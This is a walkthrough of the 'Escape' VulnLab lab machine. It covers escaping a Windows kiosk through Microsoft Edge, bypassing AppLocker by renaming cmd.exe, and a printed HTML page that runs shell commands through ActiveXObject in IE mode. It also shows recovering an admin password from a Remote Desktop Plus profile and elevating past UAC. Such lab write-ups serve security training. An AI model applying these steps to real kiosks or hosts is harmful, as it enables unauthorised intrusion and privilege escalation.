---
title: Escape
date: 2026-01-27 11:35:12
categories: ["VulnLab"]
tags: ["Insecure AppLocker Configurations", "Insecure Windows Kiosk Configurations"]
cover: https://assets.vulnlab.com/escape_slide.png
---

# TLDR
Learn how to escape a Windows Kiosk and gain RCE on a Windows machine. You will bypass UAC to gain local admin privileges.

# Enumeration
```bash
(jon@kali)-[~/vulnLab/easy/escape]$ sudo nmap -p- --min-rate=1000 -T4 escape.vl
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-22 16:09 +08
Stats: 0:06:46 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
Initiating SYN Stealth Scan at 16:09
Nmap scan report for escape.vl (10.10.65.187)
Host is up (0.16s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 718.57 seconds
```
- Only port 3389 for RDP is open.

## RDP (3389)
```bash
(jon@kali)-[~/vulnLab/easy/escape]$ sudo nmap -p3389 --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -T4 escape.vl
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-22 16:25 +08
Nmap scan report for escape.vl (10.10.65.187)
Host is up (0.17s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Host script results:
| rdp-enum-encryption:
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|     RDSTLS: SUCCESS
|     SSL: SUCCESS
|   RDP Protocol Version: Unknown
|_  (This script attempts to determine which Security layer and Encryption level is supported by the RDP service)

| rdp-ntlm-info:
|   Target_Name: ESCAPE
|   NetBIOS_Domain_Name: ESCAPE
|   NetBIOS_Computer_Name: ESCAPE
|   DNS_Domain_Name: Escape
|   DNS_Computer_Name: Escape
|   Product_Version: 10.0.19041
|   System_Time: 2026-01-22T08:25:24+00:00
|_  (This script extracts target information from NTLMSSP responses during RDP authentication)

Nmap done: 1 IP address (1 host up) scanned in 6.03 seconds
```
- RDP enumeration with Nmap scripts proved insignificant.

![RDP to escape.vl](\images\Escape\rdp.png)
- Without any credentials, I attempted to RDP to `escape.vl` using rdesktop. You can also use xfreerdp. A new window spawned with a message - "Login as KioskUser0 without Password". We have a username now.

# Gaining a Foothold (Escaping Windows Kiosk)
![Busan Expo Kiosk](\images\Escape\kiosk.png)
- Clicking on the box, we login as KioskUser0 without a password and see a “Busan Expo” site. Honestly, I couldn’t tell if this was a wallpaper, or a web application 😂 But by the looks of this, it looks like a Windows Kiosk. We need to find a way to escape this Kiosk and gain functional access to the machine.
- A Windows Kiosk is a locked-down mode of Windows that restricts a device to running only 1 app or a controlled set of apps. Thus, preventing users from accessing the parts of the operating system. Think of this as a super restrictive session.
- Doing some research on how to escape Windows Kiosks, I found [this article](https://blog.nviso.eu/2022/05/24/breaking-out-of-windows-kiosks-using-only-microsoft-edge/) and will be following its steps to gain interactive control of the `escape.vl` machine.

## Escaping Browser Restrictions
### Via the URL bar

![URL Bar](images\Escape\url_bar.png)
- In the Edge browser, we can use the top search bar to interact with the machine by typing `C:\`. This creates a GUI of the machine’s file system.
- I found the `user.txt` file in KioskUser0’s Desktop.
- I couldn’t find any user credentials after exploring the machine’s file system.

![Browser Alert message](images\Escape\alert_message.png)
- Typing `ftp://something` in the URL bar, an alert message appears. Translating the text, it says “This site is trying to open an app. The website is attempting to open this application.”. 열기 is open and 취소 is close.
- Click open and use Microsoft Edge to open the app. Remember to uncheck the “항상 이 앱 사용 (Always use this app)” option in the prompt box, otherwise you won’t get to choose what application to run next time.

![MS Edge](\images\Escape\ms_edge.png)
- We now have a functioning Microsoft Edge browser to interact with.

### Via File Explorer
![Escape Kiosk via File Explorer](images\Escape\file_explorer.png)
- It’s also possible to open a functioning Microsoft Edge browser using File Explorer. In the restrictive browser, type Ctrl + O to open File Explorer. Search `msedge.exe` and press enter to start a new Microsoft Edge browser. With this approach, I tried opening `cmd.exe` from the file explorer window but nothing happened, likely due to the app restrictions in the Windows Kiosk.

# RCE on `escape.vl`
## Via Name-based AppLocker Bypass
![CMD restricted](\images\Escape\restrict_cmd.png)
- With access to the file system in the browser, search for `cmd.exe` and download it.
- Click on the folder icon in the Downloads list when its done. Now, we’ve escaped MS Edge and entered File Explorer. Due to AppLocker, I failed to run `cmd.exe`.

```bash
C:\Users\kioskUser0\Downloads\msedge.exe
The system cannot find message text for message number 0x2350 in the message file for Application.

(c) Microsoft Corporation. All rights reserved.

C:\Users\kioskUser0\Downloads>
```
- Knowing that I could run MS Edge, I renamed `cmd.exe` to `msedge.exe` and successfully opened a CMD shell. Due to AppLocker, right-clicking doesn’t work, so I used the keyboard shortcut for this.

## Via ActiveXObject
Searching how to get RCE on a machine from an unrestricted Edge browser, I found this [StackOverflow post](https://stackoverflow.com/questions/44825859/get-output-on-shell-execute-in-js-with-activexobject) which explains how to get a shell in JavaScript with ActiveXObject. However, the usage of shell-executing functions in JavaScript, like ActiveXObject, don’t work on Microsoft Edge, as they insecure. Searching again, I found this [other post](https://learn.microsoft.com/en-us/answers/questions/2370784/enable-activex-control-in-microsoft-edge-latest?forum=microsoftedge-all&referrer=answers) that explains how to enable ActiveX control in Microsoft Edge.

![Use IE Mode Blog](\images\Escape\ie_mode_blog.png)
- The post says IE mode in Edge must be enabled to use ActiveXObject.

![Enable IE Mode](\images\Escape\enable_ie_mode.png)
- To enable IE mode, navigate to Settings > Default Browser and set “Allow sites to be reloaded in Internet Explorer Mode (IE Mode)” to Allow. We can also specify the pages to open in IE mode. We can use this feature to specify the path to our reverse shell to get RCE on `escape.vl`. Since the pages must be in `.html` format, we’ll put our code in a `.html` file. Click the blue Restart button to restart the browser for our `pwn.html` file to run in IE mode.

![Set pwn.html in IE Mode](\images\Escape\pwn_exception.png)
- We can only save files to KioskUser0’s Downloads folder, so we’ll put our file there and specify its full path. I’ve not created it yet. We can utilize the Developer Console feature on Edge to modify the HTML code with our malicious code.

```bash
<html dir="ltr" lang="en"><body>
<script>
    function shellExec() {
        var cmd = document.getElementById('cmd').value
        var shell = new ActiveXObject("WScript.Shell");
        try {
            var execOut = shell.Exec("cmd.exe /C \"" + cmd + "\"");
        } catch (e) {
            console.log(e);
        }
 
        var cmdStdOut = execOut.StdOut;
        var out = cmdStdOut.ReadAll();
        alert(out);
</script>
 
<form onsubmit="shellExec()">
    Command: <input id="cmd" name="cmd" type="text">
    <input type="submit">
</form></body></html>
```
- Modify the HTML source with this script. Remove all exiting JavaScript, CSS and HTML code to prevent them from interfering with our code. Only keep the `<html>` and `<body>` tags. Remember to change the language to English. Save the file in the Downloads folder as `pwn.html`. Don’t refresh the existing HTML webpage because the modified code will be lost.


# Post-Exploitation
## PrivEsc to admin
```powershell
PS C:\_admin> type .\profiles.xml
<?xml version="1.0" encoding="utf-16"?>
<!-- Remote Desktop Plus -->
<Data>
  <Profile>
    <ProfileName>admin</ProfileName>
    <UserName>127.0.0.1</UserName>
    <Password>WJkd16IDfQxXnmHlKIP8ca0G9XxnWQZgvtPgON2Wc=</Password>
    <Secure>False</Secure>
  </Profile>
</Data>
PS C:\_admin>
```
- The CMD shell from before wasn’t very user-friendly. Switching to PowerShell, I found an encrypted password string for RDP Plus for **admin** in the `C:\_admin\profiles.xml` directory.

```powershell
PS C:\Users\kioskUser0\Downloads> cp 'C:\Program Files (x86)\Remote Desktop Plus\rdp.exe' C:\_admin\rdp.exe
PS C:\Users\kioskUser0\Downloads> cd C:\_admin
PS C:\_admin> dir


    Directory: C:\_admin


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        2026-01-22     08:25                installers
d-----        2026-01-22     08:25                passwords
d-----        2026-01-22     08:25                temp
-a----        2026-01-22     08:25          0     Default.rdp
-a----        2026-01-22     08:25        574     profiles.xml
-a----        2026-01-22     08:25     267264     rdp.exe
```
- Exploring the `C:\Program Files (x86)` directory, I found a `rdp.exe` binary and copied it to the `C:\_admin` directory.

![BulletPassView.exe](\images\Escape\bulletPassView.png)
- With the “Edit profile” wizard open from `rdp.exe`, I ran BulletPassView from PowerShell and it displayed admin’s plaintext password.
- Although I got admin’s password already, I failed to RDP into `escape.vl` from Kali Linux. The session returned a long error message on the Windows login page. Likely due to a configure GPOs.

```powershell
PS C:\_admin> runas /user:admin cmd.exe
```
- Using `runas` in PowerShell and admin’s plaintext password, I started a new CMD shell as admin.

## Bypass UAC
![Admin's Privileges](\images\Escape\admin_privs.png)
- The **admin** is a local administrator but failed to access the `C:\Users\Administrator` directory, which it should. This means User Access Control (UAC) is likely implemented to restrict this.

```powershell
C:\Users\kioskUser0\Downloads>reg query hkey_local_machine\software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- I checked the registry and found that UAC is enabled. Researching online, I found that Windows applies the “Admin Approval Mode” concept when UAC is applied on local admins. With UAC enabled, sessions are run with standard user permissions by default when logged in as an admin. Hence, I couldn’t access `C:\Users\Administrator`.
- We need to trigger a UAC prompt to run an elevated terminal for us to accept and grant ourselves true Local Administrator privileges.

![Admin's Privileges after bypassing UAC](\images\Escape\admin_true_privs.png)
```powershell
PS C:\Users\> Start-Process powershell -Verb runas
```
- Using this command, I triggered a UAC prompt to open powershell as the administrator. No password was required. In the new powershell terminal, I found that I now have all the privileges a local admin would rightfully have.

```powershell
PS C:\Users> cd Administrator
Access is denied
PS C:\Users> dir .\Administrator


    Directory: C:\Users\Administrator


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        2026-01-22     08:25                3D Objects
d-----        2026-01-22     08:25                Contacts
d-----        2026-01-22     08:25                Desktop
d-----        2026-01-22     08:25                Documents
d-----        2026-01-22     08:25                Downloads
d-----        2026-01-22     08:25                Favorites
d-----        2026-01-22     08:25                Links
d-----        2026-01-22     08:25                Music
d-----        2026-01-22     08:25                OneDrive
d-----        2026-01-22     08:25                Pictures
d-----        2026-01-22     08:25                Saved Games
d-----        2026-01-22     08:25                Searches
d-----        2026-01-22     08:25                Videos
```
- I confirmed this by successfully accessing the `C:\Users\Administrator` directory.

# References
1. [HackTricks - Escaping Windows Kiosks](https://book.hacktricks.wiki/en/hardware-physical-access/escaping-from-gui-applications.html)
2. [Breaking out of Windows Kiosks using only MS Edge](https://blog.nviso.eu/2022/05/24/breaking-out-of-windows-kiosks-using-only-microsoft-edge/)
3. [Get a shell using JavaScript with ActiveXObject](https://stackoverflow.com/questions/44825859/get-output-on-shell-execute-in-js-with-activexobject)
4. [Enabling IE Mode in MS Edge](https://learn.microsoft.com/en-us/answers/questions/2370784/enable-activex-control-in-microsoft-edge-latest?forum=microsoftedge-all&referrer=answers)
5. [BulletsPassView](https://www.portablefreeware.com/index.php?id=2025)